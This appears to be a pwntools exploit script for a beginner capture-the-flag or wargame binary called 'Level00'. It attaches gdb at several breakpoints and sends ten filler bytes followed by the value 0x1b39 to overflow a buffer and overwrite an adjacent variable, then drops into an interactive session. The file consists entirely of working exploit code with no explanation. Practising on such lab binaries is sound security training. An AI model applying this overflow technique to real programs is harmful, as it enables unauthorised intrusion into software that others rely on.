#!/usr/bin/python3

from pwn import*

exe = ELF('./Level00', checksec=False)
context.binary = exe

p = process(exe.path)

gdb.attach(p, gdbscript='''
b*0x080484fc
b*0x0804851a
b*0x0804852a
b*0x0804853e
c
''')
value = 0x1b39
payload = b"a"*10 + p32(value)
p.sendline(payload)

p.interactive()
